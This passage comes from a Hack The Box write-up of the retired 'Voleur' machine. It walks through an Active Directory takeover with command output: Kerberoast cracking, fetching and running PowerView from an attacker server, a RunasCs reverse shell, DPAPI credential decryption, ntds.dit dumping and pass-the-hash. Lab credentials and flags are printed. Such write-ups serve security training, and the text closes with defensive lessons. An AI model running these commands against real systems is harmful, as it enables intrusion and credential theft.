$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$419ba18707ce715<SNIP>8cc06be178:AFireInsidedeOzarctica980219afi

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...6be178

<SNIP>
```

NetExec (`nxc`) confirmed that the password was valid.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u svc_winrm -p AFireInsidedeOzarctica980219afi
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi
```

#### 👣 Foothold as svc_winrm

I used `impacket-getTGT` to get a Kerberos TGT for `svc_winrm`.

```
fcoomans@kali:~/htb/voleur$ impacket-getTGT 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_winrm.ccache

fcoomans@kali:~/htb/voleur$ export KRB5CCNAME=svc_winrm.ccache

fcoomans@kali:~/htb/voleur$ klist
Ticket cache: FILE:svc_winrm.ccache
Default principal: svc_winrm@VOLEUR.HTB

Valid starting       Expires              Service principal
11/01/2025 22:52:23  11/02/2025 08:52:23  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 11/02/2025 22:48:22
```

And then used the TGT to log in to `dc.voleur.htb` as `svc_winrm` using `evil-winrm`.

```
fcoomans@kali:~/htb/voleur$ evil-winrm -i dc.voleur.htb -r voleur.htb -u svc_winrm

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: User is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> whoami
voleur\svc_winrm
```

### 💰 Post Exploitation

#### 🚩 user.txt

`svc_winrm` was the holder of the `user.txt` flag.

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> tree C:\Users\ /a /f
Folder PATH listing
Volume serial number is 0000019D A5C3:6454
C:\USERS
<SNIP>
+---svc_winrm
|   +---3D Objects
|   +---Contacts
|   +---Desktop
|   |       Microsoft Edge.lnk
|   |       user.txt
|   |
|   +---Documents
|   +---Downloads
<SNIP>

*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
d1ab3899158815daa267ce2e1fd1646c
```

## 🪦 Pentesting Necromancy

### 🔎 Recon

I already had the password `M1XyC9pW7qT5Vn` for user `svc_ldap` and knew that this user was a member of the `Restore_Users` group.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups Restore_Users
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               svc_ldap
```

The `Access_Review.xlsx` document stated that the account for `Todd.Wolfe` was deleted, but showed his password as `NightT1meP1dg3on14`.  
Now, what if `svc_ldap`, as a member of the `Restore_Users`, could restore Todd's account?

![](images/Pasted%20image%2020250713135204.png)

BloodHound didn't show any information for Todd, as the account was deleted.  

So, I decided to use `PowerView` to check if `Restore_Users` could actually restore deleted account objects, known as Tombstones.  
The PowerShell execution policy showed that any PowerShell script could be executed.

```
*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned
```

I started a Python HTTP server to share `PowerView`.

```
fcoomans@kali:~/htb/voleur$ python -m http.server -d /usr/share/windows-resources/powersploit/Recon/
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And downloaded it with `Invoke-WebRequest` (`iwr`) and then imported it using `Invoke-Expression` (`iex`) on the target server.

```
*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> iex (iwr http://10.10.14.95:8000/PowerView.ps1 -UseBasicParsing)
iex (iwr http://10.10.14.95:8000/PowerView.ps1 -UseBasicParsing)
```

`Convert-NameToSid` was then used to get the SID for `Restore_Users`.

```
*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> $sid = Convert-NameToSid "Restore_Users"
$sid = Convert-NameToSid "Restore_Users"
*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> $sid
$sid
S-1-5-21-3927696377-1337352550-2781715495-1602
```

And `Get-ObjectAcl` was used to check the Access Control List for all objects to see what permissions the `Restore_Users` had.  
`Restore_Users` could indeed restore deleted accounts (`Reanimate-Tombstones`).

```
*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> Get-ObjectAcl -ResolveGUIDs |Where-Object { $_.SecurityIdentifier -eq $sid }
Get-ObjectAcl -ResolveGUIDs |Where-Object { $_.SecurityIdentifier -eq $sid }


AceQualifier           : AccessAllowed
ObjectDN               : DC=voleur,DC=htb
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : Reanimate-Tombstones
ObjectSID              : S-1-5-21-3927696377-1337352550-2781715495
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3927696377-1337352550-2781715495-1602
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

<SNIP>
```

### 🧪 Exploitation

The built-in Active Directory tools had to be used to restore Todd's account, but `PowerView` breaks the tools when it's imported.  
So, I closed the `evil-winrm` session and started a new session.

`svc_ldap` had the rights to restore Todd's account.  This meant that I had to run the commands as `svc_ldap`.  
`RunasCs` could be used to do this.  So, it's downloaded from https://github.com/antonioCoco/RunasCs and shared on a Python HTTP server.

```
fcoomans@kali:~/htb/voleur$ ls www
RunasCs.exe

fcoomans@kali:~/htb/voleur$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`RunasCs` was then downloaded on the target.

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd $env:temp
*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> iwr -uri http://10.10.14.54:8000/RunasCs.exe -outfile RunasCs.exe
*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> ls RunasCs.exe


    Directory: C:\Users\svc_winrm\AppData\Local\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         11/1/2025   2:51 PM          51712 RunasCs.exe
```

An `nc` listener was started on the attack host to catch the `RunasCs.exe` reverse shell.

```
fcoomans@kali:~/htb/voleur$ rlwrap nc -lvnp 4444
listening on [any] 4444 ..
```

`RunasCs` was executed with the remote `-r` option to run `powershell.exe` as `svc_ldap` and redirect the shell to the `nc` listener.

```
*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.95:4444
```

`nc` caught the reverse shell, and `whoami` confirmed that the shell was running as user `svc_ldap`.

```
fcoomans@kali:~/htb/voleur$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.95] from (UNKNOWN) [10.10.11.76] 54347
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
```

`Get-ADObject` was used to check for Active Directory Objects containing `*todd*` in the name, even deleted ones (`-IncludeDeletedObjects`).  
It found Todd's deleted account.

```
PS C:\Windows\system32> Get-ADObject -Filter 'Name -like "todd*"' -IncludeDeletedObjects
Get-ADObject -Filter 'Name -like "todd*"' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

`Restore-ADObject` was used to restore Todd's account.

```
PS C:\Windows\system32> Get-ADObject -Filter 'Name -like "todd*"' -IncludeDeletedObjects |Restore-ADObject
Get-ADObject -Filter 'Name -like "todd*"' -IncludeDeletedObjects |Restore-ADObject
```

###  💰 Post Exploitation

NetExec (`nxc`) confirmed that Todd's account was indeed restored.

```
fcoomans@kali:~/htb/voleur$ nxc smb dc.voleur.htb -k -u todd.wolfe -p NightT1meP1dg3on14
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
```

## 🛡️ DPAPI Credentials

### 🔎 Recon

Todd had access to the `IT` share,

```
fcoomans@kali:~/htb/voleur$ nxc smb dc.voleur.htb -k -u todd.wolfe -p NightT1meP1dg3on14 --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

But Todd could access the `Second-Line Support` directory on the `IT` share.

```
fcoomans@kali:~/htb/voleur$ impacket-smbclient -k 'voleur.htb/todd.wolfe:NightT1meP1dg3on14@dc.voleur.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 11:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 22:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 17:13:03 2025 Second-Line Support
```

The `Second-Line Support` directory contained a backup of Todd's old home directory.

```
# ls
drw-rw-rw-          0  Wed Jan 29 11:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 22:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 17:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 17:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 11:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 17:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 17:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 17:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 17:13:16 2025 todd.wolfe
```

Todd's old home directory contained a Data Protection API (`DPAPI`) masterkey and credentials file.  These files contained credentials saved by Todd.  

### 🧪 Exploitation

First, I downloaded the masterkey file, which was used to encrypt the saved credentials.

```
# ls /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/*
drw-rw-rw-          0  Wed Jan 29 17:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 17:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 14:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 17:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 14:53:08 2025 SYNCHIST
# ls /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/*
drw-rw-rw-          0  Wed Jan 29 17:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 17:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 15:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 14:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 14:53:08 2025 Preferred
# get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
# !ls 08949382-134f-4c63-b93c-ce52efc0aa88
08949382-134f-4c63-b93c-ce52efc0aa88
```

And then I downloaded the encrypted credential file, which contained the encrypted saved passwords.

```
# ls /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/*
drw-rw-rw-          0  Wed Jan 29 17:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 17:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 15:13:50 2025 772275FAD58525253490A9B0039791D3
# get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
# !ls 772275FAD58525253490A9B0039791D3
772275FAD58525253490A9B0039791D3
```

`impacket-dpapi` decrypted the masterkey.

```
fcoomans@kali:~/htb/voleur$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

And the decrypted masterkey was used to get the credentials from the credentials file.  Todd save credentials for Jeremy Combs.  The password was `qT3V9pLXyN7W4m`.

```
fcoomans@kali:~/htb/voleur$ impacket-dpapi credential -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 -file 772275FAD58525253490A9B0039791D3
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

### 💰 Post Exploitation

NetExec (`nxc`) confirmed that the password for Jeremy was indeed valid.

```
fcoomans@kali:~/htb/voleur$ nxc smb dc.voleur.htb -k -u jeremy.combs -p qT3V9pLXyN7W4m
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
```

## 💾 Backup leaks sensitive information

### 🔎 Recon

I knew from the initial recon that Jeremy was also a member of the `Remote Management Users` and `Third-Line Technicians` groups.  
This meant that I could `evil-winrm` to the target with Jeremy's credentials and possibly access more files for `Third-Line Technicians` on the file share.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups "Remote Management Users"
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               svc_winrm
LDAP        dc.voleur.htb   389    DC               Jeremy Combs

fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups "Third-Line Technicians"
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               Jeremy Combs
```

NetExec (`nxc`) confirmed that Jeremy also had access to the `IT` share,

```
fcoomans@kali:~/htb/voleur$ nxc smb dc.voleur.htb -k -u jeremy.combs -p qT3V9pLXyN7W4m --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

But Jeremy could access the `Third-Line Support` directory.

```
fcoomans@kali:~/htb/voleur$ impacket-smbclient -k 'voleur.htb/jeremy.combs:qT3V9pLXyN7W4m@dc.voleur.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 11:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 22:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 18:11:29 2025 Third-Line Support
```

Which contained an SSH private key (`id_rsa`) and a note.  I downloaded both files.

```
# ls Third-Line Support/*
drw-rw-rw-          0  Thu Jan 30 18:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 11:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 18:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 18:07:35 2025 Note.txt.txt
# get Third-Line Support/id_rsa
# get Third-Line Support/Note.txt.txt
```

The note mentioned something about backups.

```
fcoomans@kali:~/htb/voleur$ cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

The `id_rsa` most probably gave access to the SSH server running on port `2222`.  But which user did it give access to?  
I changed the permission on the `id_rsa`,

```
fcoomans@kali:~/htb/voleur$ head id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqFyPMvURW/qbyRlemAMzaPVvfR7JNHznL6xDHP4o/hqWIzn3dZ66
P2absMgZy2XXGf2pO0M13UidiBaF3dLNL7Y1SeS/DMisE411zHx6AQMepj0MGBi/c1Ufi7
rVMq+X6NJnb2v5pCzpoyobONWorBXMKV9DnbQumWxYXKQyr6vgSrLd3JBW6TNZa3PWThy9
wrTROegdYaqCjzk3Pscct66PhmQPyWkeVbIGZAqEC/edfONzmZjMbn7duJwIL5c68MMuCi
9u91MA5FAignNtgvvYVhq/pLkhcKkh1eiR01TyUmeHVJhBQLwVzcHNdVk+GO+NzhyROqux
haaVjcO8L3KMPYNUZl/c4ov80IG04hAvAQIGyNvAPuEXGnLEiKRcNg+mvI6/sLIcU5oQkP
JM7XFlejSKHfgJcP1W3MMDAYKpkAuZTJwSP9ISVVlj4R/lfW18tKiiXuygOGudm3AbY65C
lOwP+sY7+rXOTA2nJ3qE0J8gGEiS8DFzPOF80OLrAAAFiIygOJSMoDiUAAAAB3NzaC1yc2

fcoomans@kali:~/htb/voleur$ chmod 600 id_rsa
```

And wrote a basic bash for loop to try the `id_rsa` with each domain user.  Remember that the domain users were saved to the `domain-users.txt` file during the initial recon.  
All logins failed, but worked for the `svc_backup` user.  In hindsight this should have been obvious, but it could have worked with any of the other user accounts...

```
fcoomans@kali:~/htb/voleur$ for user in $(cat domain-users.txt); do ssh -p 2222 -i id_rsa ${user}@dc.voleur.htb; done
Administrator@dc.voleur.htb: Permission denied (publickey).
Guest@dc.voleur.htb: Permission denied (publickey).
krbtgt@dc.voleur.htb: Permission denied (publickey).
ryan.naylor@dc.voleur.htb: Permission denied (publickey).
marie.bryant@dc.voleur.htb: Permission denied (publickey).
lacey.miller@dc.voleur.htb: Permission denied (publickey).
svc_ldap@dc.voleur.htb: Permission denied (publickey).
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

<SNIP>

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                         [ OK ]
svc_backup@DC:~$ id
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
```

I searched the mounted `/mnt/c/IT` share and found a `Backups` directory containing what appeared to be a backup of the `ntds.dit` domain password database!

```
svc_backup@DC:~$ find /mnt/c/IT
/mnt/c/IT
/mnt/c/IT/First-Line Support
find: ‘/mnt/c/IT/First-Line Support’: Permission denied
/mnt/c/IT/Second-Line Support
find: ‘/mnt/c/IT/Second-Line Support’: Permission denied
/mnt/c/IT/Third-Line Support
/mnt/c/IT/Third-Line Support/Backups
/mnt/c/IT/Third-Line Support/Backups/Active Directory
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.jfm
/mnt/c/IT/Third-Line Support/Backups/registry
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
/mnt/c/IT/Third-Line Support/id_rsa
/mnt/c/IT/Third-Line Support/Note.txt.txt
```

### 🧪 Exploitation

`scp` was used to copy the `ntds.dit` file and the `SYSTEM` and `SECURITY` registry hives from the target to the attack host.

```
fcoomans@kali:~/htb/voleur$ scp -P 2222 -i id_rsa svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/ntds.dit loot/
ntds.dit                                                                                                                                 100%   24MB 726.5KB/s   00:33

fcoomans@kali:~/htb/voleur$ scp -P 2222 -i id_rsa svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/SECURITY loot/
SECURITY                                                                                                                                 100%   32KB  40.6KB/s   00:00

fcoomans@kali:~/htb/voleur$ scp -P 2222 -i id_rsa svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/SYSTEM loot/
SYSTEM                                                                                                                                   100%   18MB 857.1KB/s   00:20
```

`impacket-secretsdump` was then used to dump all the password hashes for the domain, which included the Administrator hash.

```
fcoomans@kali:~/htb/voleur$ impacket-secretsdump -ntds loot/ntds.dit -system loot/SYSTEM -security loot/SECURITY LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)

<SNIP>

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from loot/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::

<SNIP>

[*] Cleaning up...
```

NetExec (`nxc`) confirmed that the Administrator hash was valid.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\Administrator:e656e07c56d831611b577b160b259ad2 (Pwn3d!)
```

`impacket-getTGT` was used to Pass-the-Hash (PtH) to get a TGT for the Administrator user. 

```
fcoomans@kali:~/htb/voleur$ impacket-getTGT -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 voleur.htb/Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache

fcoomans@kali:~/htb/voleur$ export KRB5CCNAME=Administrator.ccache

fcoomans@kali:~/htb/voleur$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@VOLEUR.HTB

Valid starting       Expires              Service principal
11/02/2025 01:45:37  11/02/2025 11:45:37  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 11/03/2025 01:45:30
```

`evil-winrm` was then used to log into the server as the Administrator user.

```
fcoomans@kali:~/htb/voleur$ evil-winrm -i dc.voleur.htb -r voleur.htb -u Administrator

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: User is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
voleur\administrator
```

### 💰 Post Exploitation

#### 🏆 root.txt

The Administrator user was the holder of the `root.txt` flag.

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
275e48539484fc822621ead3362ae4c6
```

I guess this wasn’t really hacking — it was just digital shoplifting. I stole so many passwords in this box, even Voleur started checking if anything was missing. 😄

And `Voleur has been Pwned!` 🎉

![](images/Pasted%20image%2020250713134626.png)

## 📚 Lessons Learned

- **Don’t use Excel as a vault.** Excel files are brittle and easy to expose; use a proper secrets manager or password vault with access controls and audit logging.
- **Least Privilege for service accounts.** `svc_ldap` having Kerberoast/ACE rights against `svc_winrm` was unnecessary risk — drop unneeded service rights and restrict SPN-related permissions.
- **Question restore rights.** Service accounts shouldn’t be able to restore tombstoned/deleted accounts; that capability should be limited to a small, audited break-glass/admin group.
- **Deleted ≠ gone.** Deletion can be reversed — fully remove sensitive accounts and credentials from backups/archives, and securely purge where required.
- **DPAPI is only as strong as the account password.** If an account password is exposed (e.g. in an Excel file) DPAPI-protected secrets can be recovered; protect account credentials and require strong, unique passwords or vaulting.
- **Protect private keys with passphrases and access controls.** An unencrypted `id_rsa` on a share is a root-level ticket; require passphrases, store keys in hardened vaults, and rotate them regularly.
- **Backups belong off the server and encrypted.** Backups of `ntds.dit` and registry hives should be stored on secured, separate media or an immutable/segregated backup system, encrypted and access-restricted — not on a share.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.